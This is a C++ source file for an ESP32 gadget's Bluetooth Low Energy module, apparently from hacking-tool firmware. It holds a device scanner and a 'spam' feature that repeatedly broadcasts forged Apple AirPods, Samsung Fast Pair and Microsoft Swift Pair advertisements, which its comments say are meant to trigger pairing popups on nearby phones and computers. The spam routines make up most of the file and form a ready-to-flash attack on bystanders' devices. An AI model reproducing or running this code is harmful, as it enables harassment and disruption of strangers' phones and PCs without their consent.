#include "BLEModule.h"
#include <BLEUtils.h>
#include <BLEServer.h>

BLEModule::BLEModule(Display& display) : _display(display) {
    _scanCb.parent = this;
}

void BLEModule::begin() {
    BLEDevice::init("ESP32");
    _scanner = BLEDevice::getScan();
    _scanner->setAdvertisedDeviceCallbacks(&_scanCb);
    _scanner->setActiveScan(true);
    _scanner->setInterval(100);
    _scanner->setWindow(99);
    Serial.println("[BLE] Ready");
}

// ─────────────────────────────────────────
//  Scan
// ─────────────────────────────────────────

void BLEModule::ScanCallback::onResult(BLEAdvertisedDevice dev) {
    if (parent->_deviceCount >= MAX_DEVICES) return;

    BLEDeviceInfo& info = parent->_devices[parent->_deviceCount++];
    strncpy(info.name,    dev.getName().c_str(),    31);
    strncpy(info.address, dev.getAddress().toString().c_str(), 17);
    info.rssi = dev.getRSSI();

    Serial.printf("[BLE] Found: %s (%s) RSSI: %d\n",
                  info.name[0] ? info.name : "[unnamed]",
                  info.address, info.rssi);
}

void BLEModule::startScan() {
    _running     = true;
    _deviceCount = 0;
    _display.drawCenteredText("Scanning BLE...", STATUSBAR_H + 30, CLR_DIM);
    _scanner->start(5, false);   // 5 second scan, non-blocking=false
    _drawScanResults();
    _running = false;
}

void BLEModule::tickScan()  {}
void BLEModule::stopScan()  { _scanner->stop(); _running = false; }

// ─────────────────────────────────────────
//  Spam
// ─────────────────────────────────────────

void BLEModule::_sendAppleAdv() {
    // Apple "continuity" proximity pairing advertisement
    // Triggers "Connect to AirPods" / "Apple Watch detected" popups on iOS
    uint8_t payload[] = {
        0x1E,       // Length
        0xFF,       // Type: manufacturer specific
        0x4C, 0x00, // Apple Company ID
        0x07,       // Continuity type: AirPods
        0x19,       // Length of following data
        0x01,       // Status
        0x02, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00
    };

    BLEAdvertising* adv = BLEDevice::getAdvertising();
    adv->stop();

    BLEAdvertisementData data;
    data.addData(std::string((char*)payload, sizeof(payload)));
    adv->setAdvertisementData(data);
    adv->start();
    delay(20);
    adv->stop();
}

void BLEModule::_sendSamsungAdv() {
    // Samsung Fast Pair advertisement
    uint8_t payload[] = {
        0x03, 0x03, 0x2C, 0xFE,         // Service UUID: Fast Pair
        0x06, 0x16, 0x2C, 0xFE,         // Service data
        0x00, 0x00, 0x00                 // Model ID placeholder
    };

    BLEAdvertising* adv = BLEDevice::getAdvertising();
    adv->stop();
    BLEAdvertisementData data;
    data.addData(std::string((char*)payload, sizeof(payload)));
    adv->setAdvertisementData(data);
    adv->start();
    delay(20);
    adv->stop();
}

void BLEModule::_sendWindowsAdv() {
    // Microsoft Swift Pair advertisement
    uint8_t payload[] = {
        0x09, 0xFF,             // Manufacturer specific, length 9
        0x06, 0x00,             // Microsoft Company ID
        0x03,                   // Swift Pair subtype
        0x00, 0x80,             // RSSI byte + reserved
        0x00, 0x00, 0x00        // Pairing payload
    };

    BLEAdvertising* adv = BLEDevice::getAdvertising();
    adv->stop();
    BLEAdvertisementData data;
    data.addData(std::string((char*)payload, sizeof(payload)));
    adv->setAdvertisementData(data);
    adv->start();
    delay(20);
    adv->stop();
}

void BLEModule::startSpam(BLESpamType type) {
    _spamType  = type;
    _running   = true;
    _spamCount = 0;
    Serial.println("[BLE] Spam started");
    _drawSpamStatus();
}

void BLEModule::tickSpam() {
    if (!_running) return;
    if (millis() - _lastTick < 30) return;
    _lastTick = millis();

    switch (_spamType) {
        case BLESpamType::APPLE:   _sendAppleAdv();   break;
        case BLESpamType::SAMSUNG: _sendSamsungAdv(); break;
        case BLESpamType::WINDOWS: _sendWindowsAdv(); break;
    }

    _spamCount++;
    if (_spamCount % 30 == 0) _drawSpamStatus();
}

void BLEModule::stopSpam() {
    _running = false;
    BLEDevice::getAdvertising()->stop();
    Serial.println("[BLE] Spam stopped");
}

// ─────────────────────────────────────────
//  Display helpers
// ─────────────────────────────────────────

void BLEModule::_drawScanResults() {
    _display.clear();
    _display.drawStatusBar("BLE Scan");

    if (_deviceCount == 0) {
        _display.drawCenteredText("No devices", SCREEN_H / 2, CLR_DIM);
        return;
    }

    int16_t y = STATUSBAR_H + 4;
    for (int i = 0; i < min(_deviceCount, MENU_MAX_ITEMS); i++) {
        char label[20];
        snprintf(label, sizeof(label), "%.15s",
                 _devices[i].name[0] ? _devices[i].name : "[unnamed]");
        _display.drawText(label, 2, y, 1, CLR_TEXT);

        char rssiStr[8];
        snprintf(rssiStr, sizeof(rssiStr), "%d", _devices[i].rssi);
        _display.drawTextRight(rssiStr, y, CLR_DIM);

        y += MENU_ITEM_H;
    }
}

void BLEModule::_drawSpamStatus() {
    const char* typeName =
        _spamType == BLESpamType::APPLE   ? "Apple" :
        _spamType == BLESpamType::SAMSUNG  ? "Samsung" : "Windows";

    int16_t y = STATUSBAR_H + 16;
    _display.fillRect(0, STATUSBAR_H + 1, SCREEN_W, 60, CLR_BG);
    _display.drawCenteredText(typeName, y, CLR_DANGER);

    char countStr[20];
    snprintf(countStr, sizeof(countStr), "Sent: %d", _spamCount);
    _display.drawCenteredText(countStr, y + 16, CLR_TEXT);
}
